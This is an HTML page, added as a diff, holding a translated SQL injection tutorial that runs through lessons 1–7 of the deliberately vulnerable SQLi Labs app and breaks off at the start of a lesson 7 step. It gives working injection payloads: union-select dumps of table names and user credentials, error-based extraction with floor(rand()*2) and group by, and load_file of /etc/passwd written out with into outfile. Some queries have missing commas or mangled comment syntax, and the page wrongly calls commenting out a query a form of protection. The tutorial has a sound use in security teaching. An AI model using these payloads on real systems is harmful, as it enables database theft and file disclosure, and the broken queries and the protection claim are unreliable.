@@ -1,0 +1,625 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><style>/* Fonts */
+@font-face{
+  font-family: octicons-anchor;
+  src: url(data:x-font-woff;charset=utf-8;base64,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) format('woff');
+}
+
+/* Body */
+html { font-size: 100%; overflow-y: scroll; -webkit-text-size-adjust: 100%; -ms-text-size-adjust: 100%; }
+
+body{
+  color:#4d4d4c;
+  font-family:Georgia, Palatino, 'Palatino Linotype', Times, 'Times New Roman',
+              "Hiragino Sans GB", "STXihei", "微软雅黑", serif;
+  font-size:12px;
+  line-height:1.5em;
+  background:#fefefe;
+  width: 45em;
+  margin: 10px auto;
+  padding: 30px;
+  border: 1px solid #ddd;
+  outline: 1300px solid #f8f8f8;
+}
+
+/* Links */
+a{ color: #06d; text-decoration:none; }
+a:hover{ color: #06e; text-decoration: underline; }
+a:active{ color:#faa700; }
+a:focus{ outline: thin dotted; }
+a:hover, a:active{ outline: 0; }
+
+::-moz-selection { background:rgba(255,255,0,0.3); color:#000 }
+::selection { background:rgba(255,255,0,0.3); color:#000 }
+
+a::-moz-selection { background:rgba(255,255,0,0.3); color:#0645ad }
+a::selection { background:rgba(255,255,0,0.3); color:#0645ad }
+
+/* Header Anchor Links*/
+a.headeranchor-link {
+  color:#111;
+  border: 0;
+  margin-left: -20px;
+  padding-right: 6px;
+  cursor: pointer;
+  position: absolute;
+  display: block;
+  top: 0;
+  left: 0;
+  bottom: 0;
+}
+
+span.headeranchor {
+  font: normal normal 16px octicons-anchor;
+  line-height: 1;
+  -moz-osx-font-smoothing: grayscale;
+  -webkit-user-select: none;
+  -moz-user-select: none;
+  -ms-user-select: none;
+  user-select: none;
+}
+
+a.headeranchor-link:hover { text-decoration: none;}
+a.headeranchor-link:visited { color:#4d4d4c; }
+a.headeranchor-link:active { color:#4d4d4c; }
+a.headeranchor-link:hover span.headeranchor:before { content: '\f05c'; }
+h1:hover a span.headeranchor:before { content: '\f05c'; }
+h2:hover a span.headeranchor:before { content: '\f05c'; }
+h3:hover a span.headeranchor:before { content: '\f05c'; }
+h4:hover a span.headeranchor:before { content: '\f05c'; }
+h5:hover a span.headeranchor:before { content: '\f05c'; }
+h6:hover a span.headeranchor:before { content: '\f05c'; }
+
+abbr { cursor: pointer; }
+
+/* Paragraphs */
+p { margin:1em 0; }
+
+/* Images */
+img {
+  max-width:100%;
+  border: 0;
+  -ms-interpolation-mode: bicubic;
+  vertical-align: middle;
+}
+
+/* Headers */
+h1,h2,h3,h4,h5,h6 {
+  font-weight:normal;
+  color:#111;
+  line-height: 1.7;
+  position: relative;
+}
+h4,h5,h6{ font-weight: bold; }
+h1 { font-size:2.5em; border-bottom: 1px solid #ddd;}
+h2 { font-size:2em; border-bottom:1px solid #eee; padding-bottom: 5px; }
+h3 { font-size:1.5em; }
+h4 { font-size:1.2em; }
+h5 { font-size:1em; }
+h6 { font-size:0.9em; }
+
+/* Block Quotes */
+blockquote {
+  color:#666666;
+  margin:0;
+  padding-left: 3em;
+  border-left: 0.5em #EEE solid;
+}
+hr { display: block; height: 2px; border: 0; border-top: 1px solid #aaa;border-bottom: 1px solid #eee; margin: 1em 0; padding: 0; }
+
+/* Raw Blocks */
+span.backtick {
+  border:1px solid #EAEAEA;
+  border-radius:3px;
+  background:#F8F8F8;
+  padding:0 3px 0 3px;
+}
+
+pre, code, kbd, samp {
+  color: #000;
+  font-family: Consolas, "Liberation Mono", Menlo, Courier, monospace;
+  -webkit-border-radius: 3px;
+  -moz-border-radius: 3px;
+  border-radius: 3px;
+  font-size: 0.88em;
+  background-color: #F8F8F8;
+  border: 1px solid #CCC;
+}
+
+pre {
+  white-space: pre;
+  white-space: pre-wrap;
+  word-wrap: break-word;
+  padding: 10px;
+}
+
+code { padding: 0 3px 0 3px; }
+pre code { border: 0; padding: 0; }
+
+/* Admonition */
+div.admonition {
+  -webkit-border-radius: 3px;
+  -moz-border-radius: 3px;
+  border-radius: 3px;
+  font-size: 0.88em;
+  padding: 0.5em 1em 0.5em 1em;
+  margin: 10px auto;
+}
+
+div.admonition p {
+  padding: 0;
+  margin: 0.5em 0 0.5em 0;
+}
+
+p.admonition-title {
+  font-weight: bold;
+}
+
+div.admonition.attention {
+  color: #4F8A10;
+  background-color: #DFF2BF;
+  border: 1px solid #4F8A10;
+}
+
+div.admonition.caution {
+  color: #9F6000;
+  background-color: #FEEFB3;
+  border: 1px solid #9F6000;
+}
+
+div.admonition.hint {
+  color: #00529B;
+  background-color: #BDE5F8;
+  border: 1px solid #00529B;
+}
+
+div.admonition.danger {
+  color: #D8000C;
+  background-color: #FFBABA;
+  border: 1px solid #D8000C;
+}
+
+div.admonition.note {
+  color: #888888;
+  background-color: #F8F8F8;
+  border: 1px solid #888888;
+}
+
+/* Inlines */
+b, strong { font-weight: bold; }
+
+ins { background: #ff9; color: #000; text-decoration: none; }
+
+mark { background: #ff0; color: #000; font-style: italic; font-weight: bold; }
+
+sub, sup { font-size: 75%; line-height: 0; position: relative; vertical-align: baseline; }
+sup { top: -0.5em; }
+sub { bottom: -0.25em; }
+
+dfn { font-style: italic; }
+
+/* Lists */
+ul, ol { padding-left: 30px; }
+li p:last-child { margin:0 }
+li.task-list-item { list-style-type: none; }
+li.task-list-item input { float:left; margin-left: -20px; margin-top: 6px; }
+dt { font-weight: bold; font-style: italic;}
+dd { margin: 0 0 0 2em; }
+
+/* Tables */
+table { border-collapse: collapse; border: 1px solid #ddd; background-color: #fefefe; }
+table tr:nth-child(2n) { background-color: #f8f8f8; }
+td, th { border: 1px solid #ddd; padding: 6px 13px; }
+
+/* Codehilite Tables */
+table.codehilitetable { border: 0; border-spacing: 0; width: 100%; }
+td.linenos, td.code, table.codehilitetable td { border: 0; padding: 0; }
+table.codehilitetable td:not(.linenos) div.linenodiv { padding: 0 !important; }
+td.code { width: 100%; }
+table.codehilitetable td.linenos div pre, td div.linenodiv pre {
+  border: 0;
+  border-top: 1px solid #CCC;
+  border-left: 1px solid #CCC;
+  border-right: 1px solid #CCC;
+  border-bottom: 1px solid #CCC;
+  -webkit-border-radius: 0;
+  -moz-border-radius: 0;
+  border-radius: 0;
+  -webkit-border-top-left-radius: 3px;
+  -webkit-border-bottom-left-radius: 3px;
+  -moz-border-radius-topleft: 3px;
+  -moz-border-radius-bottomleft: 3px;
+  border-top-left-radius: 3px;
+  border-bottom-left-radius: 3px;
+}
+
+table.codehilitetable td.code div pre {
+  border: 0;
+  border-top: 1px solid #CCC;
+  border-right: 1px solid #CCC;
+  border-bottom: 1px solid #CCC;
+  -webkit-border-radius: 0;
+  -moz-border-radius: 0;
+  border-radius: 0;
+  -webkit-border-top-right-radius: 3px;
+  -webkit-border-bottom-right-radius: 3px;
+  -moz-border-radius-topright: 3px;
+  -moz-border-radius-bottomright: 3px;
+  border-top-right-radius: 3px;
+  border-bottom-right-radius: 3px;
+}
+
+/* Media */
+@media only screen and (min-width: 480px) {
+  body{ font-size:14px; }
+}
+
+@media only screen and (min-width: 768px) {
+  body{ font-size:16px; }
+}
+
+@media print {
+  * { background: transparent !important; color: black !important; filter:none !important; -ms-filter: none !important; }
+  body{ font-size:12pt; max-width:100%; outline:none; border: 0;}
+  a, a:visited { text-decoration: underline; }
+  a.headeranchor-link { display: none; }
+  hr { height: 1px; border:0; border-bottom:1px solid black; }
+  a[href]:after { content: " (" attr(href) ")"; }
+  abbr[title]:after { content: " (" attr(title) ")"; }
+  .ir a:after, a[href^="javascript:"]:after, a[href^="#"]:after { content: ""; }
+  pre, blockquote { border: 1px solid #999; padding-right: 1em; page-break-inside: avoid; }
+  tr, img { page-break-inside: avoid; }
+  img { max-width: 100% !important; }
+  p, h2, h3 { orphans: 3; widows: 3; }
+  h2, h3 { page-break-after: avoid; }
+}
+</style><title>SQL EN</title></head><body><p><img alt="1.png" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/1.png" /></p>
+<h2 id="introduction"><a name="user-content-introduction" href="#introduction" class="headeranchor-link"  aria-hidden="true"><span class="headeranchor"></span></a>Introduction</h2>
+<p>Structured Query Language, also known as SQL, is basically a programming language that deals with databases. For beginners, databases are simply data stores that contain both client side and server side data. SQL manages databases through structured queries, relations, object oriented programming, etc. Programming geeks will have come across many such types of software, like MySQL, MS SQL, Oracle, and Postgresql. These are a few of the programs that give us the capability to manage large databases/data stores through structured queries. Script kiddies would definitely have had hands-on experience with terms like SQL injection, which they may have even performed through the use of automated tools like SQL Map or SQL Ninja, but may not know the actual working of it. In this short tutorial I will try to give you a deep understanding of how SQL injection works, how an attack takes place, and what it takes to call an application SQL-vulnerable. The lab we will be using for demonstration is SQLi Labs, which can be freely downloaded from <a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a> solely for the purpose of studying and making applications safe from such vulnerabilities, talking from a programmer’s perspective. So this tutorial will have a hands-on mix both for coders and for security testers. </p>
+<h2 id="installation"><a name="user-content-installation" href="#installation" class="headeranchor-link"  aria-hidden="true"><span class="headeranchor"></span></a>Installation:</h2>
+<ol>
+<li>Download the source from <a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a></li>
+<li>Copy this into your Apache webroot folder ( htddocs, /var/www)</li>
+<li>Open the file “db-creds.inc,” which can be found under sql-connections folder</li>
+<li>Change the mysql username and password to your own</li>
+<li>Open your browser and access the folder through localhost to fire the index.html file</li>
+<li>Click on the link setup/resetDB to create the database in your mysql</li>
+<li>Game on!</li>
+</ol>
+<p><img alt="2.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/2.jpg" /></p>
+<h2 id="labs"><a name="user-content-labs" href="#labs" class="headeranchor-link"  aria-hidden="true"><span class="headeranchor"></span></a>Labs:</h2>
+<h3 id="lesson-1-get-error-based-single-quotes-string"><a name="user-content-lesson-1-get-error-based-single-quotes-string" href="#lesson-1-get-error-based-single-quotes-string" class="headeranchor-link"  aria-hidden="true"><span class="headeranchor"></span></a>Lesson 1: GET – Error-Based – Single Quotes – String</h3>
+<p><img alt="3.png" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/3.png" /></p>
+<p>You get a “Welcome Dhakkan” (a Hindi slang word that usually refers to a stupid person). The programmer for SQLI Labs definitely has a good sense of humor. Now we get a parameter “id” with numeric value injection.</p>
+<p><strong>-&gt; ?id=1</strong></p>
+<p>Fire!</p>
+<p><img alt="4.png" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/4.png" /></p>
+<p>Task completed! We have the login name Dumb and the password is Dump. So basically we added a parameter to the URL and pointed that parameter to the first record. There was an immediate query from the browser to the database table to fetch the record for id=1. Similarly, you can fire the query for subsequent records like 2, 3, 4….</p>
+<p>Here is the actual query which ran at the back end:</p>
+<p><code>Select * from TABLE where id=1;</code></p>
+<h3 id="lesson-2-get-error-based-integer-based"><a name="user-content-lesson-2-get-error-based-integer-based" href="#lesson-2-get-error-based-integer-based" class="headeranchor-link"  aria-hidden="true"><span class="headeranchor"></span></a>Lesson 2: GET – Error-Based – Integer-Based</h3>
+<p>Now we try to attack the application similarly by putting in strings such as “abc“and “abcd.” We observe that for lesson 2 we receive an error from the database. Next we do a bit of tampering with the number and add a ‘ (single quote) with the number.</p>
+<p><img alt="5.png" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/5.png" /></p>
+<p>We again get an error in the Mysql server for incorrect syntax.</p>
+<p><strong>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’ LIMIT 0,1′ at line 1</strong></p>
+<p>Now the query which it changes to is</p>
+<p><code>Select * from TABLE where id = 1’ ;</code></p>
+<p>So we have an odd number of single quotes (‘), which breaks the query and also string input throwing error.</p>
+<p>Hence the result we come out with is that the coder has used integer for the query</p>
+<p><code>Select * from TABLE where id = (some integer value);</code></p>
+<p>Now, from the developer’s perspective, to add protection from such errors we can comment out the rest of the query:</p>
+<p><code>http://localhost/sqli-labs/Less-2/?id=1–-</code></p>
+<p>Note: Be sure to add a space after the comments or URL encoded space (%20) or else the comment will not work.</p>
+<p><img alt="6.png" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/6.png" /></p>
+<h2 id="lesson-3-error-based-single-quotes-with-twist-string"><a name="user-content-lesson-3-error-based-single-quotes-with-twist-string" href="#lesson-3-error-based-single-quotes-with-twist-string" class="headeranchor-link"  aria-hidden="true"><span class="headeranchor"></span></a>Lesson 3: Error-based single quotes with twist – string</h2>
+<p>In this lesson we will learn to perform an error-based single quote attack. In the screenshot below, we quote</p>
+<p><code>?id=’</code></p>
+<p><img alt="8.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/8.jpg" /></p>
+<p>After injecting the code we got an error message like</p>
+<p><strong>MySQL server version for the right syntax to use near ””) LIMIT 0,1′ at line 1</strong></p>
+<p>Here it means that the developer has used the query which is</p>
+<p><code>Select login_name, select password from table where id= (‘our input here’)</code></p>
+<p>So again we inject the code with this</p>
+<p><code>?id=1′) -–+</code></p>
+<p><img alt="11.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/11.jpg" /></p>
+<p>We are able to get through with the username and password and the query has been commented out.</p>
+<h2 id="lesson-4-error-based-double-quotes-string"><a name="user-content-lesson-4-error-based-double-quotes-string" href="#lesson-4-error-based-double-quotes-string" class="headeranchor-link"  aria-hidden="true"><span class="headeranchor"></span></a>Lesson 4: Error-based double quotes string</h2>
+<p>In this lesson we will learn to perform an error-based double quotes attack as shown below in the screenshot</p>
+<p><code>?id=1"</code></p>
+<p><img alt="13.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/13.jpg" /></p>
+<p>After injecting the code we can see a username and password. Now we try to dump the database to retrieve some sensitive information. Let us assume in the beginning that there are three columns presented in the database. So here we use the union select command to dump the database like this: </p>
+<p><code>?id=1") union select 1,2,3 –+</code></p>
+<p>Now to do some sql basics we start mysql and check the database through the query</p>
+<p><code>show databases;</code></p>
+<p><img alt="15.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/15.jpg" /></p>
+<p>For the purpose of this lab the database name is <strong>security</strong> so we select security through the command.</p>
+<p><code>Use security;</code></p>
+<p><img alt="17.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/17.jpg" /></p>
+<p>Now we check the tables with show tables;</p>
+<p><img alt="19.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/19.jpg" /></p>
+<p>Here we can see there are four tables and let us see the structure of the table.</p>
+<p><code>desc emails;</code></p>
+<p><img alt="22.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/22.jpg" /></p>
+<p>Before continuing to the front-end attack we want to discuss the system database, which is <strong>information_schema</strong>. So we use it through</p>
+<p><code>use information_schema</code></p>
+<p><img alt="24.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/24.jpg" /></p>
+<p>Let us see the tables.</p>
+<p><code>Show tables;</code></p>
+<p><img alt="26.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/26.jpg" /></p>
+<p>Now we have to enumerate the table first</p>
+<p><code>desc tables;</code></p>
+<p><img alt="28.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/28.jpg" /></p>
+<p>Now we use this query:</p>
+<p><code>select table_name from information_schema.tables where table_schema = “security”;</code></p>
+<p><img alt="30.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/30.jpg" /></p>
+<p>On using the query, it dumps the table names. We now inject the same query into the URL; the query is</p>
+<p><code>?id=1”) union select 1,table_name,3 from information_schema.tables where table_schema=’security’ --+</code></p>
+<p>and we can see the first table name email in the screen.</p>
+<p><img alt="32.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/32.jpg" /></p>
+<p>Another method is to group together all the table names and dump it out as a string. The query for doing this is</p>
+<p><code>?id=1”) union select 1,group_concat(table_name)3 from information_schema.tables where table_schema=’security’ – -+</code></p>
+<p>And in the result we can see all the tables.</p>
+<p><img alt="33.png" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/33.png" /></p>
+<p>We group concat different columns and dump it in a single shot with this</p>
+<p><code>?id=1′ union select 1,group_concat(username),group_concat(password) from users –+</code></p>
+<p>And we can see the result on the screen.</p>
+<p><img alt="35.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/35.jpg" /></p>
+<h3 id="lesson-5fixing-the-query-without-using-comments"><a name="user-content-lesson-5fixing-the-query-without-using-comments" href="#lesson-5fixing-the-query-without-using-comments" class="headeranchor-link"  aria-hidden="true"><span class="headeranchor"></span></a>Lesson 5:Fixing the query without using comments</h3>
+<p>In this lesson we will learn to perform an error-based double quotes injection attack as shown below.</p>
+<p><code>?id=1′ AND ’2</code><br />
+OR <br />
+<code>?id=3′ AND ’4</code></p>
+<p><img alt="37.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/37.jpg" /></p>
+<p>After injecting this type of code, the database always shows different usernames and passwords. Now we use the union select command to get more sensitive information from the database. Here is the query we use:</p>
+<p><code>-6′ union select 5, version(),3 AND ’1</code></p>
+<p><img alt="39.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/39.jpg" /></p>
+<p>In this query we use the version() function for detecting the database version; similarly, we can use another different query for retrieving more information from database. Now we use the query for getting the current username:</p>
+<p><code>-6′ union select 5,current_user,3 AND ’1</code></p>
+<p><img alt="41.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/41.jpg" /></p>
+<h3 id="lesson-6-double-injection-double-quote"><a name="user-content-lesson-6-double-injection-double-quote" href="#lesson-6-double-injection-double-quote" class="headeranchor-link"  aria-hidden="true"><span class="headeranchor"></span></a>Lesson 6: Double-injection double quote</h3>
+<p>In this lesson we will learn how to perform an error-based double quote injection attack, as shown in the screenshot below:</p>
+<p><code>?id=3</code></p>
+<p><img alt="42.png" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/42.png" /></p>
+<p>After injecting the query, we can see an sql error message on the screen. Before continuing further, we will discuss some basic functions of sql (a treat to both the programmers and the testers). We start from the count function, which just returns us the number of rows.</p>
+<p><code>select count(*) from information_schema.tables;</code> </p>
+<p><img alt="45.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/45.jpg" /></p>
+<p>Let us try another one by using random function. By using this function we get a random value between 1 and 0:</p>
+<p><code>select rand() ;</code></p>
+<p><img alt="47.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/47.jpg" /></p>
+<p>Another interesting function which we use here is group by clause; let us see an example:</p>
+<p><code>select table_name, table_schema from information_schema.tables group by table_schema</code></p>
+<p><img alt="49.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/49.jpg" /></p>
+<p>Now we come to the main point that we were working on, which was dumping the database in the form of a sql error.</p>
+<p>Let us select the database:</p>
+<p><code>select database();</code></p>
+<p><img alt="50.png" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/50.png" /></p>
+<p>It shows our current database security. Now let us add a few more things to the query (select<br />
+database()) between the parenthesis. We concatenate the output with the query:</p>
+<p><code>select concat((select database()));</code></p>
+<p><img alt="53.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/53.jpg" /></p>
+<p>Now add some fancy displays like this:</p>
+<p><code>select concat(0x3a,0x3a,(select database()),0x3a,0x3a)</code></p>
+<p>This is a hex value for a column.</p>
+<p><img alt="55.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/55.jpg" /></p>
+<p>Copy these strings in Notepad as we are building them.</p>
+<p><img alt="61.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/61.jpg" /></p>
+<p>Since this string select concat(0x3a,0x3a(select database()),0x3a,0x3a)<br />
+is very big, we should give it a short name like a.</p>
+<p>Here is the query for it: </p>
+<p><code>select concat(0x3a,0x3a(select database()),0x3a,0x3a) a;</code></p>
+<p><img alt="81.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/81.jpg" /></p>
+<p>Again copy the string:</p>
+<p><img alt="602.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/602.jpg" /></p>
+<p>Now let us add some randomness to it using:</p>
+<p><code>select concat(0x3a,0x3a(select database()),0x3a,0x3a, floor (rand()*2)) a;</code></p>
+<p><img alt="61.png" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/61.png" /></p>
+<p>And copy the string.</p>
+<p><img alt="62.png" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/62.png" /></p>
+<p>Let us add multiple values by defining any random table to like this: </p>
+<p><code>select concat(0x3a,0x3a(select database()),0x3a,0x3a, floor (rand()*2)) a from information_schema.columns;</code></p>
+<p><img alt="63.png" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/63.png" /></p>
+<p>After typing this we can see here the number of rows:</p>
+<p><img alt="64.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/64.jpg" /></p>
+<p>Copy the string again.</p>
+<p><img alt="601.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/601.jpg" /></p>
+<p>Now you can select tables or any database from information_schema that you want like this:</p>
+<p><code>select concat(0x3a,0x3a(select database()),0x3a,0x3a, floor (rand()*2)) a from information_schema.tables;</code></p>
+<p><img alt="58.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/58.jpg" /></p>
+<p>After typing this we can see here the number of rows:</p>
+<p><img alt="70.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/70.jpg" /></p>
+<p>Copy the string.</p>
+<p><img alt="72.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/72.jpg" /></p>
+<p>Now add another column into the previous string and group the whole string by a like this:</p>
+<p><code>select count(*),concat(0x3a,0x3a(select database()),0x3a,0x3a, floor (rand()*2)) a from information_schema.tables group by a;</code></p>
+<p><img alt="75.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/75.jpg" /></p>
+<p>And here we see the output in above screenshot (60:0 and 67:1). Now we again use in the same query three to four times like this:</p>
+<p><img alt="76.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/76.png" /></p>
+<p>After some tries we get an error message since the random number is repeated.</p>
+<p><img alt="78.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/78.jpg" /></p>
+<p>Copy the string.</p>
+<p><img alt="80.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/80.jpg" /></p>
+<p>But in that error message it gives the core path, the database name security, as we asked it do. Let us ask it for the version name:</p>
+<p><code>select count(*),concat(0x3a,0x3a(select version()),0x3a,0x3a, floor (rand()*2)) a from information_schema.columns group by a;</code></p>
+<p><img alt="81.png" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/81.png" /></p>
+<p>And it dumps the version name.</p>
+<p><img alt="831.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/831.jpg" /></p>
+<p>Let us try to dump a user:</p>
+<p><code>select count(*),concat(0x3a,0x3a(select user()),0x3a,0x3a, floor (rand()*2)) a from information_schema.columns group by a;</code></p>
+<p><img alt="84.png" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/84.png" /></p>
+<p>After using the query a few times it generates an sql error message with username:</p>
+<p><img alt="86.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/86.jpg" /></p>
+<p>By this technique we can dump the information from the database through the sql error message.</p>
+<h3 id="lesson-7-dumping-database-using-out-file"><a name="user-content-lesson-7-dumping-database-using-out-file" href="#lesson-7-dumping-database-using-out-file" class="headeranchor-link"  aria-hidden="true"><span class="headeranchor"></span></a>Lesson 7: Dumping database using out file</h3>
+<p>In this lesson, we will learn how to dump the database by using outfile. Let us start by breaking the sql query like this:</p>
+<p><code>?id=1′–-+</code></p>
+<p><img alt="88.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/88.jpg" /></p>
+<p>Now I would like to discuss some functions at the back end. Start mysql at your terminal and use the database security:</p>
+<p><code>use security;</code></p>
+<p><img alt="90.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/90.jpg" /></p>
+<p>Let us dump the database with basic commands: </p>
+<p><code>select * from users;</code></p>
+<p><img alt="92.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/92.jpg" /></p>
+<p>Now dump the database and ask mysql to write it into a file by using a function called outfile, so the query is</p>
+<p><code>select * from users into outfile “/tmp/tests.txt”</code></p>
+<p><img alt="94.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/94.jpg" /></p>
+<p>Let us see the content of the test.txt file.</p>
+<p><img alt="95.png" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/95.png" /></p>
+<p>There is another function, which is known as dump file. Dump file uses only a single row so we have to give it a limit for dumping the database:</p>
+<p><code>select * from users limit 0,1 into dumpfile “/tmp/test2.txt”</code></p>
+<p><img alt="97.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/97.jpg" /></p>
+<p>Another function which is used is load file. It is used for loading files from the file system into mysql. Here is the query:</p>
+<p><code>select load_file(“etc/passwd”);</code></p>
+<p><img alt="99.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/99.jpg" /></p>
+<p>It has dumped the passwd file.</p>
+<p><img alt="100.png" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/100.png" /></p>
+<p>Combine both of them and dump the combination into an outfile. The query is</p>
+<p><code>select load_file(“etc/passwd”) into outfile “tmp/test4.txt”;</code></p>
+<p><img alt="101.png" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/101.png" /></p>
+<p>Let us see the test4.txt file:</p>
+<p><img alt="102.png" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/102.png" /></p>
+<p>Now come to the front end part and type in this query into the address bar:</p>
